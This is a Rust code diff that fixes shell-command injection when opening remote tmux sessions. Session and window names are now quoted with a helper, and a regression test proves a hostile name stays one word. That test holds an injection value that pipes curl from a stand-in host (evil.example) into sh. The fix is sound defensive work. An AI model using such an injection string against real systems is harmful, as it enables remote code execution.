@@ -13,6 +13,8 @@ use anyhow::{Context, Result};
 use chrono::{DateTime, Utc};
 use serde::Deserialize;
 
+use crate::sh;
+
 /// Which of the three panel groups a job belongs to.
 #[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
 pub enum Status {
@@ -172,11 +174,14 @@ impl Remote {
             // Grouped and attached in one: the group gives the pane its own
             // size and its own selected window, and `destroy-unattached`
             // takes the group away when you leave.
+            // Quoted through `sh`, not by hand: the far side evaluates this
+            // string, and both halves of the target are names chosen on that
+            // machine rather than here.
             Some((session, window)) => [
-                format!("tmux new-session -t '{session}'"),
+                format!("tmux new-session -t {}", sh::quote(session)),
                 "set destroy-unattached on".to_string(),
                 "set -w aggressive-resize on".to_string(),
-                format!("select-window -t '{window}'"),
+                format!("select-window -t {}", sh::quote(window)),
             ]
             .join(" \\; "),
             None => "exec ${SHELL:-sh} -l".to_string(),
@@ -1144,14 +1149,43 @@ mod tests {
         let script = command.last().unwrap();
         // Grouped, not attached: the user is already attached from their own
         // terminal, and a second client would force both to the smaller size.
-        assert!(script.contains("new-session -t 'autodad'"), "{script}");
-        assert!(script.contains("select-window -t '@2'"), "{script}");
+        // Quoted only where quoting says something: an ordinary session name
+        // is one word already, and the command is meant to be readable.
+        assert!(script.contains("new-session -t autodad"), "{script}");
+        assert!(script.contains("select-window -t @2"), "{script}");
         // And it takes itself away when the tab closes, so the panel does not
         // litter the machine with grouped sessions.
         assert!(script.contains("destroy-unattached on"), "{script}");
         // Escaped, because the remote shell would otherwise end the command
         // at the semicolon instead of handing tmux one.
         assert!(script.contains("\\;"), "{script}");
+    }
+
+    #[test]
+    fn a_tmux_name_cannot_become_a_second_command() {
+        // The target is read from `sessions/<pid>.json` on the far side and
+        // spent in a string that box's shell evaluates. Hand-written quotes
+        // let a session name end the string and start a command of its own.
+        let remote = Remote {
+            host: "claude-box".to_string(),
+            tmux: Some("a';curl evil.example|sh;'x:@1.%1".to_string()),
+            pid: Some(4242),
+        };
+        let script = remote.open_command().last().unwrap().clone();
+
+        // Proof rather than shape: give the string to a real shell, with
+        // `tmux` swapped for something that says what words it was handed.
+        // Unquoted, the `;curl` half runs as a command of its own.
+        let out = std::process::Command::new("sh")
+            .arg("-c")
+            .arg(script.replacen("tmux ", "printf '[%s]' ", 1))
+            .output()
+            .expect("running sh");
+        let said = String::from_utf8_lossy(&out.stdout);
+        assert!(
+            said.contains("[a';curl evil.example|sh;'x]"),
+            "the target should arrive as one word: {said}"
+        );
     }
 
     #[test]
